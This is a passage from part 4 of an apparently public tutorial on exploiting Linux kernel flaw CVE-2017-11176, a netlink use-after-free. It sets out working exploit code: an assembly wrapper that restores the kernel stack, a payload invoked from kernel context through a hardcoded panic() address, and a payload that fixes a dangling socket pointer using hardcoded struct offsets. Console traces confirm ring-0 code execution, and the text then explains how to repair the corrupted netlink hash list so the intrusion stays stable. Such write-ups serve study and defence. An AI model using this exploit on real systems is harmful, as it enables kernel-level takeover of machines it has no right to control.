<span class="k">static</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">))</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">wrapper</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// avoid the prologue</span>
<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"userland_entry:"</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// reconstruct original rbp/rsp</span>
<span class="w">  </span><span class="n">restored_rbp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">saved_rbp_hi</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">saved_rbp_lo</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">restored_rsp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">saved_rbp_hi</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">saved_esp</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"movq %0, %%rax</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
<span class="w">                    </span><span class="s">"movq %%rax, %%rbp</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
<span class="w">                    </span><span class="o">::</span><span class="w"> </span><span class="s">"m"</span><span class="p">(</span><span class="n">restored_rbp</span><span class="p">)</span><span class="w">  </span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"movq %0, %%rax</span><span class="se">\n</span><span class="s">"</span><span class="w">  </span>
<span class="w">                    </span><span class="s">"movq %%rax, %%rsp</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
<span class="w">                    </span><span class="o">::</span><span class="w"> </span><span class="s">"m"</span><span class="p">(</span><span class="n">restored_rsp</span><span class="p">)</span><span class="w">  </span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// FIXME: call to "real" payload</span>

<span class="w">  </span><span class="c1">// arbitrary call primitive requires a non-null return value (i.e. non zero RAX register)</span>
<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"movq $5555, %%rax</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
<span class="w">                    </span><span class="o">::</span><span class="w"> </span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// avoid the epilogue and the "leave" instruction</span>
<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"ret"</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>When the <em>ret</em> instruction is executed, the kernel thread stack pointer as well as <em>RBP</em> are restored. In addition, <em>RAX</em> holds a non-zero value. That is, we will return from <em>curr-&gt;func()</em> and <strong>the kernel can continue its "normal" execution</strong>.</p><p>Edit the <em>main()</em> code to check if everything went well:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="c1">// trigger the arbitrary call primitive</span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] invoking arbitray call primitive...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3535</span><span class="p">;</span><span class="w"> </span><span class="c1">// need to be different than zero</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">_setsockopt</span><span class="p">(</span><span class="n">unblock_fd</span><span class="p">,</span><span class="w"> </span><span class="n">SOL_NETLINK</span><span class="p">,</span><span class="w"> </span><span class="n">NETLINK_NO_ENOBUFS</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">val</span><span class="p">)))</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="s">"[-] setsockopt"</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">goto</span><span class="w"> </span><span class="n">fail</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">}</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] arbitrary call succeed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">PRESS_KEY</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>If we run, we should have:</p><div class="highlight"><pre><span></span><code>...
[+] reallocation succeed! Have fun :-)
[ ] invoking arbitray call primitive...
[+] arbitrary call succeed!
[ ] press key to continue...

&lt;&lt;&lt; KERNEL CRASH HERE &gt;&gt;&gt;
</code></pre></div><p>Perfect, <strong>the kernel now crashes during exit</strong> (just like in part 2)! It means the stack has been properly restored.</p><h2 id="calling-the-payload">Calling the Payload</h2><p>In order to be done with the wrapper, let's call the payload. For debugging purpose only, we will simply call <em>panic()</em> for now:</p><div class="highlight"><pre><span></span><code><span class="c1">// kernel function symbols</span>
<span class="cp">#define PANIC_ADDR ((void*) 0xffffffff81553684)</span>

<span class="k">typedef</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">panic</span><span class="p">)(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">payload</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="p">((</span><span class="n">panic</span><span class="p">)(</span><span class="n">PANIC_ADDR</span><span class="p">))(</span><span class="s">"HELLO FROM USERLAND"</span><span class="p">);</span><span class="w">  </span><span class="c1">// called from kernel land</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Edit the <em>wrapper()</em> function:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">))</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">wrapper</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// avoid the prologue</span>
<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"userland_entry:"</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// reconstruct original rbp/rsp</span>
<span class="w">  </span><span class="n">restored_rbp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">saved_rbp_hi</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">saved_rbp_lo</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">restored_rsp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">saved_rbp_hi</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">saved_esp</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"movq %0, %%rax</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
<span class="w">                    </span><span class="s">"movq %%rax, %%rbp</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
<span class="w">                    </span><span class="o">::</span><span class="w"> </span><span class="s">"m"</span><span class="p">(</span><span class="n">restored_rbp</span><span class="p">)</span><span class="w">  </span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"movq %0, %%rax</span><span class="se">\n</span><span class="s">"</span><span class="w">  </span>
<span class="w">                    </span><span class="s">"movq %%rax, %%rsp</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
<span class="w">                    </span><span class="o">::</span><span class="w"> </span><span class="s">"m"</span><span class="p">(</span><span class="n">restored_rsp</span><span class="p">)</span><span class="w">  </span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="n">payload</span><span class="p">;</span><span class="w">           </span><span class="c1">// &lt;----- HERE</span>
<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"movq %0, %%rax</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
<span class="w">                    </span><span class="s">"call *%%rax</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
<span class="w">                    </span><span class="o">::</span><span class="w"> </span><span class="s">"m"</span><span class="p">(</span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// arbitrary call primitive requires a non-null return value (i.e. non zero RAX register)</span>
<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"movq $5555, %%rax</span><span class="se">\n</span><span class="s">"</span><span class="w"></span>
<span class="w">                    </span><span class="o">::</span><span class="w"> </span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// avoid the epilogue and the "leave" instruction</span>
<span class="w">  </span><span class="n">__asm__</span><span class="w"> </span><span class="nf">volatile</span><span class="p">(</span><span class="w"> </span><span class="s">"ret"</span><span class="w"> </span><span class="o">::</span><span class="w"> </span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Now, if we launch the exploit we get the following trace:</p><div class="highlight"><pre><span></span><code>[ 1394.774972] Kernel panic - not syncing: HELLO FROM USERLAND      // &lt;-----
[ 1394.775078] Pid: 2522, comm: exploit 
[ 1394.775200] Call Trace:
[ 1394.775342]  [&lt;ffffffff8155372b&gt;] ? panic+0xa7/0x179
[ 1394.775465]  [&lt;ffffffff81553684&gt;] ? panic+0x0/0x179              // &lt;-----
[ 1394.775583]  [&lt;ffffffff81061909&gt;] ? __wake_up_common+0x59/0x90   // &lt;-----
[ 1394.775749]  [&lt;ffffffff810665a8&gt;] ? __wake_up+0x48/0x70
[ 1394.775859]  [&lt;ffffffff814b81cc&gt;] ? netlink_setsockopt+0x13c/0x1c0
[ 1394.776022]  [&lt;ffffffff81475a2f&gt;] ? sys_setsockopt+0x6f/0xc0
[ 1394.776167]  [&lt;ffffffff8100b1a2&gt;] ? system_call_fastpath+0x16/0x1b
</code></pre></div><p>Awesome! Since we restored both the kernel stack pointer (thread stack) and the stack frame pointer, <strong>we get a "clean" call trace</strong>. In addition, we see the "HELLO FROM USERLAND" message, meaning that we definitely control the kernel flow of execution. In other words, <strong>we have arbitrary code execution in Ring-0</strong> and we can write our payload in C language (no need to ROP anymore).</p><p>We are almost done with the exploit but two things remain:</p><ol><li>Repair the kernel (mandatory)</li><li>Fun &amp; Profit (optional)</li></ol><hr><h1 id="repair-the-kernel">Repair the Kernel</h1><p><em>"Yesterday you said tomorrow... So just DO IT!"</em></p><p>In the previous section, we successfully exploit our arbitrary call primitive to gain a fully arbitrary code execution in ring-0 where we can write our final payload in C. In this section, we will use it to repair the kernel. <strong>Note that this step is not optional as our exploit is still crashing the kernel upon exit</strong>.</p><p>As mentioned in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>, we need to <strong>fix all <em>dangling pointers</em> introduced by the exploit</strong>. Fortunately, we already enumerated them in the previous part:</p><ul><li>the <strong>sk</strong> pointer in the <em>struct socket</em> associated to <em>unblock_fd</em> file descriptor</li><li>pointers in the <em>nl_table</em> hash list</li></ul><h2 id="fixing-the-struct-socket">Fixing the <em>struct socket</em></h2><p>In the "Core Concept #1" (cf. <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">part 1</a>), we introduced the relationship between a file descriptor and its associated ("specialized") file:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/core_struct_relationship.png" title="Core Structure Relationship"><figcaption class="figcaption figure-caption text-center">core struct relationship</figcaption></figure><p></p><p>What we need to fix here is the pointer between <em>struct socket</em> and <em>struct sock</em> (i.e. the <strong>sk</strong> field).</p><p>Remember that we crashed during exit because of UAFs in <em>netlink_release()</em>?</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_release</span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">sk</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">                 </span><span class="c1">// &lt;----- hit this!</span>

<span class="w">    </span><span class="n">netlink_remove</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
</code></pre></div><p>As we can see, if <em>sk</em> is <em>NULL</em> the whole code will be skipped. In other words, repairing the broken <em>struct socket</em> can be done with:</p><div class="highlight"><pre><span></span><code><span class="n">current</span><span class="o">-&gt;</span><span class="n">files</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">[</span><span class="n">unblock_fd</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="o">-&gt;</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>

<span class="w">                                                   </span><span class="o">^</span><span class="w"> </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"></span>
<span class="w">                                     </span><span class="o">^</span><span class="w"> </span><span class="k">struct</span> <span class="nc">file</span><span class="w"></span>
<span class="w">                      </span><span class="o">^</span><span class="w"> </span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">**</span><span class="w"></span>
<span class="w">                </span><span class="o">^</span><span class="w"> </span><span class="k">struct</span> <span class="nc">files_struct</span><span class="w"></span>
<span class="w">          </span><span class="o">^</span><span class="w"> </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"></span>
<span class="o">^---</span><span class="w"> </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="w"></span>
</code></pre></div><p><strong>NOTE</strong>: We use <em>unblock_fd</em> here as the other file descriptors have been closed during the exploitation. This is the same fd used to invoke the arbitrary call primitive.</p><p>That is, we need:</p><ol><li>the value of the <em>current</em> pointer</li><li>the offsets of all of the aforementioned structures</li></ol><p>It is important to only reset this pointer and let the kernel do the "normal" housekeeping (decrement refcounter, release objects, etc.). <strong>It prevents memory leaks!</strong></p><p>For instance, we could only reset the fdt entry to NULL as we did with SystemTap (i.e. <em>current-&gt;files-&gt;fdt-&gt;fdt[unblock_fd] = NULL</em>) but this would introduce memory leaks on <em>file</em>, <em>socket</em>, <em>inode</em> and potentially other objects.</p><p>Alright, we saw in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a> how to do kernel structure "mimicking". However, those are the big boys (especially <em>task_struct</em> and <em>file</em>). That is, we will be a bit lazier and only define the necessary fields while using <em>hardcoded offsets</em>:</p><div class="highlight"><pre><span></span><code><span class="cp">#define TASK_STRUCT_FILES_OFFSET (0x770) </span><span class="c1">// [include/linux/sched.h]</span>
<span class="cp">#define FILES_STRUCT_FDT_OFFSET (0x8) </span><span class="c1">// [include/linux/fdtable.h]</span>
<span class="cp">#define FDT_FD_OFFSET (0x8) </span><span class="c1">// [include/linux/fdtable.h]</span>
<span class="cp">#define FILE_STRUCT_PRIVATE_DATA_OFFSET (0xa8)</span>
<span class="cp">#define SOCKET_SK_OFFSET (0x38)</span>

<span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">pad</span><span class="p">[</span><span class="n">SOCKET_SK_OFFSET</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">pad</span><span class="p">[</span><span class="n">FILE_STRUCT_PRIVATE_DATA_OFFSET</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">private_data</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">fdtable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">pad</span><span class="p">[</span><span class="n">FDT_FD_OFFSET</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">file</span><span class="w"> </span><span class="o">**</span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">files_struct</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">pad</span><span class="p">[</span><span class="n">FILES_STRUCT_FDT_OFFSET</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">fdtable</span><span class="w"> </span><span class="o">*</span><span class="n">fdt</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">pad</span><span class="p">[</span><span class="n">TASK_STRUCT_FILES_OFFSET</span><span class="p">];</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">files_struct</span><span class="w"> </span><span class="o">*</span><span class="n">files</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p><strong>NOTE</strong>: We already saw in part 3 how to extract offsets from disassembly. Search a code dereferencing a particular field and note the offset used.</p><p>Before writing the repairing payload, we are missing one thing: the <strong>current</strong> pointer value. If you read the "Core Concept #4", you should know that the kernel uses the <em>task</em> field of the <em>thread_info</em> structure to retrieve it.</p><p>In addition, we know that we can retrieve the <em>thread_info</em> by masking ANY kernel thread stack pointer. We have the latter, as we saved and restored <em>RSP</em>. That is, we will use the following macro:</p><div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">thread_info</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w">  </span><span class="o">*</span><span class="n">task</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">pad</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>

<span class="cp">#define THREAD_SIZE (4096 &lt;&lt; 2)</span>

<span class="cp">#define get_thread_info(thread_stack_ptr) \</span>
<span class="cp">  ((struct thread_info*) (thread_stack_ptr &amp; ~(THREAD_SIZE - 1)))</span>

<span class="cp">#define get_current(thread_stack_ptr) \</span>
<span class="cp">  ((struct task_struct*) (get_thread_info(thread_stack_ptr)-&gt;task))</span>
</code></pre></div><p>In the end, the <em>payload()</em> function becomes:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">payload</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w"> </span><span class="o">*</span><span class="n">current</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_current</span><span class="p">(</span><span class="n">restored_rsp</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">current</span><span class="o">-&gt;</span><span class="n">files</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">[</span><span class="n">unblock_fd</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"> </span><span class="c1">// keep it for later use</span>
<span class="w">  </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span><span class="c1">// fix the 'sk' dangling pointer</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>It really looks like "normal" kernel code isn't it?</p><p>Now, let's launch the exploit:</p><div class="highlight"><pre><span></span><code>$ ./exploit
...
<span class="o">[</span> <span class="o">]</span> invoking arbitrary call primitive...
<span class="o">[</span>+<span class="o">]</span> arbitrary call succeed!
<span class="o">[</span>+<span class="o">]</span> exploit complete!
$                                           // &lt;----- no crash!
</code></pre></div><p><strong>Perfect, the kernel doesn't crash upon exit anymore!</strong> BUT, we are not done yet!</p><p>Now, try to run this command:</p><div class="highlight"><pre><span></span><code>$ cat /proc/net/netlink
<span class="o">&lt;&lt;&lt;</span> KERNEL CRASH &gt;&gt;&gt;
</code></pre></div><div class="highlight"><pre><span></span><code>[ 1392.097743] BUG: unable to handle kernel NULL pointer dereference at 0000000000000438
[ 1392.137715] IP: [&lt;ffffffff814b70e8&gt;] netlink_seq_next+0xe8/0x120
[ 1392.148010] PGD 1cc62067 PUD 1b2df067 PMD 0 
[ 1392.148240] Oops: 0000 [#1] SMP 
...
[ 1393.022706]  [&lt;ffffffff8155adae&gt;] ? do_page_fault+0x3e/0xa0
[ 1393.023509]  [&lt;ffffffff81558055&gt;] ? page_fault+0x25/0x30
[ 1393.024298]  [&lt;ffffffff814b70e8&gt;] ? netlink_seq_next+0xe8/0x120        // &lt;---- the culprit
[ 1393.024914]  [&lt;ffffffff811e8e7b&gt;] ? seq_read+0x26b/0x410
[ 1393.025574]  [&lt;ffffffff812325ae&gt;] ? proc_reg_read+0x7e/0xc0
[ 1393.026268]  [&lt;ffffffff811c0a65&gt;] ? vfs_read+0xb5/0x1a0
[ 1393.026920]  [&lt;ffffffff811c1d86&gt;] ? fget_light_pos+0x16/0x50
[ 1393.027665]  [&lt;ffffffff811c0e61&gt;] ? sys_read+0x51/0xb0
[ 1393.028446]  [&lt;ffffffff8100b1a2&gt;] ? system_call_fastpath+0x16/0x1b
</code></pre></div><p>Doh :-( A NULL pointer dereference... Yup, the kernel is still in an <em>unstable</em> state as <strong>we didn't repair all dangling pointers</strong>. In other words, we do not crash when the exploit is complete, yet <strong>a time bomb is ticking</strong>. Which leads us to the next section.</p><h2 id="fixing-the-nl_table-hash-list">Fixing the nl_table hash list</h2><p>Fixing this one is actually trickier than it looks because it uses hash list that brings two issues:</p><ul><li>The <em>hlist_head</em> type uses a single "first" pointer (i.e. this is not circular)</li><li>Elements are stored in various buckets and forcing "adjacency" can be tedious</li></ul><p>In addition, the Netlink implementation uses a "dilution" mechanism during insertion which mess things up. Let's see how we can repair it!</p><p><strong>NOTE</strong>: Netlink uses hash tables to quickly retrieve a <em>struct sock</em> from a <em>pid</em> (cf. <em>netlink_lookup()</em>). We already saw one usage with <em>netlink_getsockbypid()</em> called by <em>netlink_unicast()</em> (cf. part 2).</p><h3 id="fixing-a-corrupted-list">Fixing a Corrupted List</h3><p>In this section, we will see how to fix a corrupted doubly-linked list in general. We assume at this point that we already have arbitrary code execution (hence arbitrary read/write).</p><p>A normal list looks like this:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/list_normal.png" title="Normal List"><figcaption class="figcaption figure-caption text-center">list_normal.png</figcaption></figure><p></p><p>Now, suppose we free and then reallocate the middle element. Since we don't know its original "next" and "prev" pointer, the list is corrupted. In addition, the adjacent elements have dangling pointers:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/list_after_realloc.png" title="List After Reallocation"><figcaption class="figcaption figure-caption text-center">list_after_realloc.png</figcaption></figure><p></p><p>With such list, it is not possible to do several operations (like walking the list) as it will lead to bad dereferences (and mostly a crash).</p><p>From here, we can do various things. First we can try to fix the reallocated element next/prev pointer, so the list just looks like the original one. Or, we can try to put our reallocated element out of the list (i.e. the adjacent elements point to each other):</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/list_jump_over.png" title="List Jump Over"><figcaption class="figcaption figure-caption text-center">list_jump_over.png</figcaption></figure><p></p><p>Both choices imply that we know the addresses of the adjacent elements. Now, let's suppose that we don't actually know these addresses (even with arbitrary read). Are we screwed? Nope!</p><p>The idea is to use "guard" elements before/after the reallocation element that we <em>control</em>. As they still have a dangling pointer after reallocation, <strong>removing them from the list will actually "fix up" our reallocation element without knowing any address</strong> (unroll the <em>list_del()</em> code to convince yourself):</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/list_guard_del.png" title="List Removing Guard"><figcaption class="figcaption figure-caption text-center">list_guard_del.png</figcaption></figure><p></p><p>Of course, we can now use a classical <em>list_del()</em> on the reallocated element here to completely remove it from the list which is repaired now.</p><p>That is, the technique imposes two constraints:</p><ol><li>We setup one or two adjacent "guard" elements</li><li>We can remove those guards from the list <em>at will</em></li></ol><p>As we will see in the next sections, having 1) in our context is a bit tricky (because of hash function and the "dilute" mechanism). In the exploit, we will use a "hybrid" approach (stay tune).</p><h3 id="lost-in-space">Lost in Space</h3><p>If you haven't read the sections about Netlink data structures and the associated algorithms in Core Concepts #4, it might be the time to get back to it.</p><p>Let's identify the dangling pointers in the <em>nl_table</em> hash list (the ones we need to repair).</p><p>After the reallocation, the <em>next</em> and <em>pprev</em> fields of our "fake <em>netlink_sock</em>" holds junk data. In addition the "original" previous and/or next elements of the bucket list have dangling pointers.</p><p><strong>The strategy we will use to repair the corrupted hash list is to restore the <em>next/pprev</em> values of our reallocated element and then do a <em>__hlist_del()</em> operation to fix the dangling pointers.</strong></p><p>However...</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/nl_table_dangling.png" title="Corrupted nl_table"><figcaption class="figcaption figure-caption text-center">nl_table_dangling.png</figcaption></figure><p></p><p>That's right, the elements succeeding our reallocation are "lost in space". What does that even mean? <strong>There is nothing pointing to it anymore</strong>. The "only link" that existed has been overwritten by the reallocation. And yet, we need to repair its <em>pprev</em> pointer! All of this <strong>because the hash list are NOT circular.</strong> That's tough...</p><p>Before going back to this issue, let's solve the "<em>pprev</em>" pointer of our fake <em>netlink_sock</em>. This is not a big deal:</p><ol><li>Find the <em>NETLINK_USERSOCK</em> hash table with <em>nl_table</em> (exported symbol)</li><li>Find the correct bucket by <strong>replaying the hash function</strong> using the <strong>original</strong> 